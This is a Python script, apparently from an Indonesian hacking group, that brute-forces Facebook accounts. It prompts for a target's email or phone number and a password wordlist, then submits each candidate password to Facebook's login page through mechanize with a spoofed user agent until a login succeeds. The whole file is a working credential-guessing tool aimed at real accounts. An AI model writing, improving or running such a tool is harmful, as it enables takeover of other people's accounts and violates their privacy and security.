#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random




email = str(raw_input("[!] Facebook Username (atau) Email (atau) Nomor Telepon Target: "))


passwordlist = str(raw_input("[!] Path Dan Nama wordlist ? : "))

tytyd = str(raw_input("[!] Jangan Lupa Bersyukur [!](Tekan Enter)"))
login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (Linux; Android 11; Infinix X695C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'])
def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	hell()
	search()
	print("Wordlist Habis! Let's try again - Nelo.F4")

	
	
def brute(password):
	sys.stdout.write("\r[!] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Detected! = {}".format(password))
			raw_input("Have a nice day - Nelo.F4")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

def hell():
    color = "\033[31;1m"
    hel = """
.%%%%%...%%..%%..%%%%%...%%%%%%.
.%%..%%..%%..%%..%%..%%..%%.....
.%%%%%...%%..%%..%%%%%...%%%%...
.%%..%%..%%..%%..%%..%%..%%.....
.%%%%%....%%%%...%%..%%..%%.....
................................
.%%%%%%...%%%%....%%%%...%%.......%%%%..
...%%....%%..%%..%%..%%..%%......%%.....
...%%....%%..%%..%%..%%..%%.......%%%%..
...%%....%%..%%..%%..%%..%%..........%%.
...%%.....%%%%....%%%%...%%%%%%...%%%%..
........................................
<-----> Bruteforce Facebook v.0.1 <----->
<----->     !Coded By Nelo.F4     <----->
<----->   Explosion Squad Cyber   <----->
.........................................\n\n
"""
    wkwk ="\033[32;1m"
    total = open(passwordlist,"r")
    total = total.readlines()
    print (color+hel)
    print (wkwk)
    print "  [!] Target : {}".format(email)
    print "  [!] Loaded :" , len(total), "password"
    print "  [!] Wait, ngopi aja dulu ...\n\n"


if __name__ == '__main__':
            main()
 
